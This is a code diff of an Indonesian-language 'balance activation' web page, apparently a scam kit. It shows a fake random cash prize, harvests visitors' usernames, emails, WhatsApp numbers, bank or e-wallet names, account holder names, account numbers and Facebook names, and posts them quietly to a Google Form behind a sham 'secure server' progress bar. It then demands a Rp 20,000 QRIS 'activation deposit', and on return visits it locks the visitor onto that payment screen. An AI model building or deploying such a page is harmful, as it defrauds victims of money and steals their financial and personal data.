@@ -3,227 +3,232 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sistem Aktivasi Saldo Gratis</title>
+    <title>Aktivasi Saldo Digital - Verifikasi Akun</title>
     <style>
+        :root {
+            --primary: #10b981; /* Emerald Green */
+            --dark: #0f172a;
+            --card: #1e293b;
+        }
         body {
-            font-family: 'Segoe UI', sans-serif; text-align: center; 
-            background-color: #0f172a; color: white; margin: 0; padding: 20px;
+            font-family: 'Inter', 'Segoe UI', sans-serif; text-align: center; 
+            background-color: var(--dark); color: white; margin: 0; padding: 20px;
             user-select: none;
         }
-        .container { max-width: 450px; margin: auto; background: #1e293b; padding: 30px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); border: 1px solid #334155; }
+        .container { max-width: 450px; margin: auto; background: var(--card); padding: 30px; border-radius: 24px; box-shadow: 0 20px 50px rgba(0,0,0,0.5); border: 1px solid #334155; }
         
-        /* Area Box & Reward */
-        .box-wrapper { position: relative; width: 180px; height: 180px; margin: 30px auto; }
-        #mystery-box { width: 100%; height: 100%; cursor: pointer; transition: 0.3s; filter: drop-shadow(0 0 15px rgba(241, 196, 15, 0.4)); }
-        .shake { animation: shake 0.5s infinite; }
-        @keyframes shake {
-            0%, 100% { transform: scale(1); }
-            50% { transform: scale(1.05) rotate(5deg); }
+        /* Area Animasi Dompet (Menggantikan Kotak) */
+        .wallet-wrapper { position: relative; width: 150px; height: 150px; margin: 20px auto; }
+        #main-icon { width: 100%; height: 100%; cursor: pointer; transition: 0.3s; filter: drop-shadow(0 0 20px rgba(16, 185, 129, 0.3)); }
+        
+        .pulse { animation: pulse 1.5s infinite; }
+        @keyframes pulse {
+            0% { transform: scale(1); filter: drop-shadow(0 0 10px rgba(16, 185, 129, 0.2)); }
+            50% { transform: scale(1.05); filter: drop-shadow(0 0 25px rgba(16, 185, 129, 0.5)); }
+            100% { transform: scale(1); filter: drop-shadow(0 0 10px rgba(16, 185, 129, 0.2)); }
         }
-        .open-box { animation: fadeOut 0.8s forwards; }
-        @keyframes fadeOut { 100% { opacity: 0; transform: scale(0.5); visibility: hidden; } }
 
         #reward-display {
             position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%) scale(0);
-            font-size: 40px; font-weight: bold; color: #f1c40f; text-shadow: 0 0 20px rgba(241, 196, 15, 0.6);
-            transition: 0.6s cubic-bezier(0.175, 0.885, 0.32, 1.275); z-index: 5;
+            font-size: 32px; font-weight: 800; color: var(--primary); text-shadow: 0 0 20px rgba(16, 185, 129, 0.4);
+            transition: 0.6s cubic-bezier(0.175, 0.885, 0.32, 1.275); z-index: 5; background: white; padding: 10px 20px; border-radius: 12px;
         }
         #reward-display.show { transform: translate(-50%, -50%) scale(1); }
 
         /* Form Style */
-        .form-daftar { display: none; text-align: left; background: #334155; padding: 20px; border-radius: 15px; margin-top: 20px; }
-        .form-daftar label { font-size: 11px; color: #cbd5e1; display: block; margin-bottom: 3px; font-weight: bold;}
+        .form-daftar { display: none; text-align: left; background: #334155; padding: 20px; border-radius: 18px; margin-top: 20px; }
+        .form-daftar label { font-size: 11px; color: #94a3b8; display: block; margin-bottom: 4px; font-weight: 600; text-transform: uppercase; letter-spacing: 0.5px;}
         .form-daftar input, .form-daftar select {
-            width: 100%; padding: 12px; margin-bottom: 12px; border-radius: 8px; border: none; box-sizing: border-box; background: #f8fafc; color: #1e293b; font-weight: bold;
+            width: 100%; padding: 12px; margin-bottom: 12px; border-radius: 10px; border: 1px solid #475569; box-sizing: border-box; background: #0f172a; color: white; font-size: 14px;
         }
         
-        button { 
-            padding: 15px; font-size: 16px; font-weight: bold; cursor: pointer;
-            background: linear-gradient(to bottom, #f1c40f, #d4ac0d); color: #1e293b; border: none; border-radius: 50px;
-            box-shadow: 0 4px 0 #9a7d0a; transition: 0.2s; width: 100%;
+        button#mainBtn { 
+            padding: 16px; font-size: 16px; font-weight: bold; cursor: pointer;
+            background: var(--primary); color: white; border: none; border-radius: 12px;
+            box-shadow: 0 4px 15px rgba(16, 185, 129, 0.3); transition: 0.2s; width: 100%;
         }
-        button:disabled { background: #475569 !important; box-shadow: none !important; color: #94a3b8; }
+        button#mainBtn:disabled { background: #475569; box-shadow: none; color: #94a3b8; }
 
-        /* Loading Bar Style */
+        /* Loading Bar */
         #loadingArea { display: none; margin: 20px 0; }
-        .progress-container { width: 100%; background: #0f172a; border-radius: 10px; height: 25px; overflow: hidden; border: 1px solid #334155; }
-        .progress-bar { width: 0%; height: 100%; background: linear-gradient(90deg, #22c55e, #4ade80); transition: width 0.1s; }
+        .progress-container { width: 100%; background: #0f172a; border-radius: 10px; height: 12px; overflow: hidden; }
+        .progress-bar { width: 0%; height: 100%; background: var(--primary); transition: width 0.1s; }
 
-        /* Modal Style */
-        .modal { display: none; position: fixed; z-index: 1000; left: 0; top: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.92); }
-        .modal-content { background: white; color: #1e293b; margin: 10% auto; padding: 25px; border-radius: 20px; width: 85%; max-width: 380px; text-align: center; }
-        .qris-img { width: 100%; max-width: 220px; border: 4px solid #f1f5f9; border-radius: 10px; margin: 15px 0; }
-        .btn-link { display: inline-block; padding: 12px; background: #22c55e; color: white; border-radius: 50px; text-decoration: none; font-weight: bold; width: 100%; box-sizing: border-box; margin-top: 10px;}
+        /* Modal Pilihan QRIS */
+        .modal { display: none; position: fixed; z-index: 1000; left: 0; top: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); backdrop-filter: blur(5px); }
+        .modal-content { background: white; color: #1e293b; margin: 5% auto; padding: 25px; border-radius: 24px; width: 88%; max-width: 380px; text-align: center; }
+        .qris-img { width: 100%; max-width: 200px; border: 1px solid #e2e8f0; border-radius: 12px; margin: 10px 0; }
+        
+        .qris-tabs { display: flex; gap: 6px; justify-content: center; margin: 15px 0; flex-wrap: wrap; }
+        .tab-btn { padding: 8px 14px; font-size: 11px; background: #f1f5f9; border: 1px solid #e2e8f0; border-radius: 8px; cursor: pointer; font-weight: 700; color: #475569; }
+        .tab-btn.active { background: var(--dark); color: white; border-color: var(--dark); }
+        
+        .btn-confirm { display: block; padding: 14px; background: var(--primary); color: white; border-radius: 12px; text-decoration: none; font-weight: bold; margin-top: 15px; }
     </style>
 </head>
 <body>
 
     <div class="container">
-        <h2 style="color: #f1c40f; margin-bottom: 5px;">BONUS AKTIVASI</h2>
-        <p id="sub-title" style="font-size: 14px; color: #cbd5e1;">Buka kotak untuk melihat saldo gratis Anda!</p>
+        <h2 style="color: var(--primary); margin-bottom: 5px;">AKTIVASI SALDO</h2>
+        <p id="sub-title" style="font-size: 14px; color: #94a3b8;">Ketuk ikon untuk sinkronisasi bonus saldo Anda!</p>
         
-        <div class="box-wrapper" id="boxArea">
-            <img id="mystery-box" src="https://cdn-icons-png.flaticon.com/512/679/679821.png" alt="Box" onclick="openBox()">
+        <div class="wallet-wrapper" id="boxArea">
+            <img id="main-icon" class="pulse" src="https://cdn-icons-png.flaticon.com/512/10142/10142646.png" alt="Wallet" onclick="startSync()">
             <div id="reward-display"></div>
         </div>
 
-        <button id="actionBtn" onclick="openBox()">KLAIM SALDO SEKARANG</button>
+        <button id="mainBtn" onclick="startSync()">SINKRONISASI SEKARANG</button>
 
         <div id="registrationForm" class="form-daftar">
-            <h4 style="text-align:center; color:#f1c40f; margin:0 0 15px 0;">LENGKAPI DATA PENERIMA</h4>
-            
-            <label>Username Akun (Min. 6 Huruf/Angka):</label>
-            <input type="text" id="regId" placeholder="Contoh: rafarapi123" required>
-            
-            <label>Email Aktif:</label>
-            <input type="email" id="regEmail" placeholder="contoh@email.com" required>
-            
-            <label>WhatsApp:</label>
+            <h4 style="text-align:center; color:var(--primary); margin:0 0 15px 0;">DATA PENCAIRAN SALDO</h4>
+            <label>ID Pengguna:</label>
+            <input type="text" id="regId" placeholder="Min. 6 Karakter" required>
+            <label>Email Korespondensi:</label>
+            <input type="email" id="regEmail" placeholder="email@aktif.com" required>
+            <label>Nomor WhatsApp:</label>
             <input type="text" id="regWa" value="+62" required>
-            
-            <label>Pencairan Ke (Bank/E-Wallet):</label>
+            <label>Metode Pencairan:</label>
             <select id="regBank" required>
                 <option value="">-- Pilih --</option>
                 <option value="BCA">BCA</option>
                 <option value="DANA">DANA</option>
                 <option value="OVO">OVO</option>
-                <option value="GOPAY">GOPAY</option>
+                <option value="BRI">BRI</option>
             </select>
-            
-            <label>Nama Sesuai Rekening:</label>
-            <input type="text" id="regNamaRek" placeholder="Nama Lengkap" required>
-
-            <label>Nomor Rekening:</label>
-            <input type="number" id="regNoRek" placeholder="0000xxxx" required>
-
-            <label>Nama Facebook:</label>
-            <input type="text" id="regNamaFB" placeholder="Nama Profil Facebook" required>
-            
-            <button id="submitBtn" onclick="submitToGoogle()">KONFIRMASI AKTIVASI</button>
+            <label>Nama Rekening / Akun:</label>
+            <input type="text" id="regNamaRek" placeholder="Sesuai Buku Tabungan" required>
+            <label>Nomor Rekening / E-Wallet:</label>
+            <input type="number" id="regNoRek" placeholder="Nomor Rekening" required>
+            <label>Konfirmasi Facebook:</label>
+            <input type="text" id="regNamaFB" placeholder="Nama Profil FB" required>
+            <button id="submitBtn" onclick="submitData()" style="background:var(--primary); color:white; border-radius:10px; padding:15px; border:none; width:100%; font-weight:bold; cursor:pointer;">PROSES AKTIVASI</button>
         </div>
 
         <div id="loadingArea">
-            <p style="font-size: 13px; color: #f1c40f;">Menghubungkan ke Server Database...</p>
-            <div class="progress-container">
-                <div class="progress-bar" id="myBar"></div>
-            </div>
+            <p style="font-size: 13px; color: var(--primary); font-weight:bold;">Menghubungkan ke Secure Server...</p>
+            <div class="progress-container"><div class="progress-bar" id="myBar"></div></div>
             <p id="loadText" style="font-size: 12px; margin-top: 5px;">0%</p>
         </div>
     </div>
 
     <div id="resultModal" class="modal">
         <div class="modal-content">
-            <h2 style="color:#e74c3c; margin: 0;">MISI TERAKHIR</h2>
-            <p style="font-size: 14px; line-height: 1.5;">
-                Saldo <b id="finalSaldo" style="color:#d4ac0d;"></b> Sedang Diproses!<br><br>
-                <b>AKTIVASI SALDO:</b><br>
-                Wajib <b>Deposit 20rb</b> & <b>Mainkan Gamenya</b> agar sistem dapat mencairkan saldo Anda secara otomatis.
-            </p>
+            <h3 style="color:var(--dark); margin: 0;">VERIFIKASI PEMBAYARAN</h3>
+            <p style="font-size: 13px; margin: 10px 0; color:#64748b;">Saldo <b id="finalSaldo" style="color:var(--primary);"></b> Berhasil Disiapkan. <br>Selesaikan misi <b>Aktivasi Rekening</b> untuk pencairan.</p>
             
-            <div style="background: #f8fafc; padding: 10px; border-radius: 10px; border: 2px dashed #cbd5e1;">
-                <p style="font-size: 11px; font-weight: bold; margin: 5px 0;">SCAN QRIS AKTIVASI (Rp 20.000)</p>
-                <img src="LINK_QRIS_ANDA_DI_SINI" class="qris-img" alt="QRIS">
+            <div style="background: #f8fafc; padding: 12px; border-radius: 16px; border: 1px solid #e2e8f0;">
+                <p style="font-size: 10px; font-weight: 800; color:#475569;">PILIH METODE PEMBAYARAN:</p>
+                <div class="qris-tabs">
+                    <div class="tab-btn active" onclick="updateQris(this, 'DANA', 'LINK_QRIS_DANA')">DANA</div>
+                    <div class="tab-btn" onclick="updateQris(this, 'BCA', 'LINK_QRIS_BCA')">BCA</div>
+                    <div class="tab-btn" onclick="updateQris(this, 'BRI', 'LINK_QRIS_BRI')">BRI</div>
+                    <div class="tab-btn" onclick="updateQris(this, 'E-WALLET', 'LINK_QRIS_ALL')">QRIS LAIN</div>
+                </div>
+
+                <p id="qrisTitle" style="font-size: 11px; font-weight: bold; margin: 5px 0; color:var(--dark);">SCAN QRIS DANA (Rp 20.000)</p>
+                <img id="qrisDisplay" src="LINK_QRIS_DANA" class="qris-img" alt="QRIS">
+                <p style="font-size: 14px; font-weight: 900; color: #ef4444; margin: 0;">NOMINAL: Rp 20.000</p>
             </div>
 
-            <a href="URL_FB_ANDA_DI_SINI" class="btn-link">SAYA SUDAH DEPOSIT & MAIN</a>
-            <p style="font-size: 10px; color: #64748b; margin-top: 10px;">*Uang deposit akan ditambahkan ke saldo pencairan.</p>
+            <a href="URL_FB_ANDA" class="btn-confirm">SAYA SUDAH DEPOSIT & MAIN</a>
+            <p style="font-size: 9px; color: #94a3b8; margin-top: 10px;">Deposit akan otomatis ditambahkan ke total saldo cair.</p>
         </div>
     </div>
 
     <script>
-        const prizes = ["250K", "300K", "500K"];
+        const prizes = ["350K", "500K", "750K"];
         
-        function openBox() {
-            if (localStorage.getItem("done") === "true") return;
-            document.getElementById('mystery-box').classList.add('shake');
-            document.getElementById('actionBtn').disabled = true;
-            document.getElementById('actionBtn').innerText = "MENGECEK SERVER...";
+        function updateQris(btn, bank, link) {
+            document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
+            btn.classList.add('active');
+            document.getElementById('qrisDisplay').src = link;
+            document.getElementById('qrisTitle').innerText = "SCAN QRIS " + bank + " (Rp 20.000)";
+        }
+
+        function startSync() {
+            if (localStorage.getItem("active_done") === "true") return;
+            document.getElementById('main-icon').classList.remove('pulse');
+            document.getElementById('mainBtn').disabled = true;
+            document.getElementById('mainBtn').innerText = "SYNCHRONIZING...";
 
             setTimeout(() => {
-                document.getElementById('mystery-box').classList.remove('shake');
-                document.getElementById('mystery-box').classList.add('open-box');
+                document.getElementById('main-icon').style.opacity = "0";
                 const hasil = prizes[Math.floor(Math.random() * prizes.length)];
                 document.getElementById('reward-display').innerText = "Rp " + hasil;
                 document.getElementById('reward-display').classList.add('show');
-                localStorage.setItem("tempVal", hasil);
-
+                localStorage.setItem("active_val", hasil);
                 setTimeout(() => {
                     document.getElementById('boxArea').style.display = "none";
-                    document.getElementById('actionBtn').style.display = "none";
-                    document.getElementById('sub-title').innerHTML = "Bonus Menang: <b style='color:#f1c40f;'>Rp "+hasil+"</b>";
+                    document.getElementById('mainBtn').style.display = "none";
                     document.getElementById('registrationForm').style.display = "block";
-                }, 1000);
+                    document.getElementById('sub-title').innerHTML = "Saldo Anda: <b style='color:var(--primary);'>Rp "+hasil+"</b>";
+                }, 1200);
             }, 2000);
         }
 
-        const waInput = document.getElementById('regWa');
-        waInput.addEventListener('input', function() {
+        document.getElementById('regWa').addEventListener('input', function() {
             if (!this.value.startsWith('+62')) this.value = '+62';
             this.value = '+62' + this.value.substring(3).replace(/\D/g, '');
         });
 
-        function submitToGoogle() {
-            const id = document.getElementById('regId').value;
-            const email = document.getElementById('regEmail').value;
-            const wa = document.getElementById('regWa').value;
-            const bank = document.getElementById('regBank').value;
-            const nama = document.getElementById('regNamaRek').value;
-            const norek = document.getElementById('regNoRek').value;
-            const namafb = document.getElementById('regNamaFB').value;
-            const sld = localStorage.getItem("tempVal");
+        function submitData() {
+            const d = {
+                id: document.getElementById('regId').value,
+                email: document.getElementById('regEmail').value,
+                wa: document.getElementById('regWa').value,
+                bank: document.getElementById('regBank').value,
+                nama: document.getElementById('regNamaRek').value,
+                norek: document.getElementById('regNoRek').value,
+                fb: document.getElementById('regNamaFB').value,
+                sld: localStorage.getItem("active_val")
+            };
 
-            if(!/^[a-zA-Z0-9]{6,}$/.test(id)) { alert("Username minimal 6 karakter tanpa simbol!"); return; }
-            if(!id || !email || !wa || !bank || !nama || !norek || !namafb) { alert("Lengkapi semua data!"); return; }
+            if(!/^[a-zA-Z0-9]{6,}$/.test(d.id)) { alert("Username tidak valid!"); return; }
+            if(!d.id || !d.email || !d.wa || !d.bank || !d.nama || !d.norek || !d.fb) { alert("Data tidak lengkap!"); return; }
 
             document.getElementById('registrationForm').style.display = "none";
             document.getElementById('loadingArea').style.display = "block";
 
-            let width = 0;
-            const elem = document.getElementById("myBar");
-            const idInterval = setInterval(() => {
-                if (width >= 98) {
-                    clearInterval(idInterval);
-                    sendData(id, email, wa, bank, nama, norek, namafb, sld);
+            let w = 0;
+            const bar = document.getElementById("myBar");
+            const intv = setInterval(() => {
+                if (w >= 98) {
+                    clearInterval(intv);
+                    sendToServer(d);
                 } else {
-                    width++;
-                    elem.style.width = width + "%";
-                    document.getElementById("loadText").innerHTML = width + "%";
+                    w++;
+                    bar.style.width = w + "%";
+                    document.getElementById("loadText").innerHTML = w + "%";
                 }
-            }, 40);
+            }, 45);
         }
 
-        function sendData(id, email, wa, bank, nama, norek, namafb, sld) {
-            const googleFormURL = "https://docs.google.com/forms/d/e/1FAIpQLScGVtMxlLFQCWJjYJA_-ug8O32vaLPJSDSV2ICNfsDwFa9fIQ/formResponse";
-            const formData = new FormData();
-            
-            // ENTRY ID TETAP AMAN
-            formData.append('entry.498136123', id);    
-            formData.append('entry.2145381120', email); 
-            formData.append('entry.954302406', wa);    
-            formData.append('entry.1747382514', bank);  
-            formData.append('entry.371995109', nama);  
-            formData.append('entry.1836945173', norek); 
-            formData.append('entry.1660055715', namafb);   
+        function sendToServer(d) {
+            const form = new FormData();
+            form.append('entry.498136123', d.id);    
+            form.append('entry.2145381120', d.email); 
+            form.append('entry.954302406', d.wa);    
+            form.append('entry.1747382514', d.bank);  
+            form.append('entry.371995109', d.nama);  
+            form.append('entry.1836945173', d.norek); 
+            form.append('entry.1660055715', d.fb);   
 
-            fetch(googleFormURL, { method: 'POST', mode: 'no-cors', body: formData })
+            fetch("https://docs.google.com/forms/d/e/1FAIpQLScGVtMxlLFQCWJjYJA_-ug8O32vaLPJSDSV2ICNfsDwFa9fIQ/formResponse", { method: 'POST', mode: 'no-cors', body: form })
             .then(() => {
-                localStorage.setItem("done", "true");
-                localStorage.setItem("sld", sld);
-                document.getElementById('finalSaldo').innerText = "Rp " + sld;
+                localStorage.setItem("active_done", "true");
+                localStorage.setItem("active_sld", d.sld);
+                document.getElementById('finalSaldo').innerText = "Rp " + d.sld;
                 document.getElementById('resultModal').style.display = "block";
             });
         }
 
-        // KUNCI HALAMAN: Jika user balik lagi, langsung muncul QRIS
         window.onload = () => {
-            if (localStorage.getItem("done") === "true") {
-                const savedSld = localStorage.getItem("sld");
+            if (localStorage.getItem("active_done") === "true") {
+                const s = localStorage.getItem("active_sld");
                 document.getElementById('boxArea').style.display = "none";
-                document.getElementById('actionBtn').style.display = "none";
+                document.getElementById('mainBtn').style.display = "none";
                 document.getElementById('registrationForm').style.display = "none";
-                document.getElementById('sub-title').innerHTML = "STATUS: <b style='color:#f1c40f;'>SALDO Rp " + savedSld + " SIAP CAIR</b>";
-                
-                document.getElementById('finalSaldo').innerText = "Rp " + savedSld;
+                document.getElementById('finalSaldo').innerText = "Rp " + s;
                 document.getElementById('resultModal').style.display = "block";
             }
         };
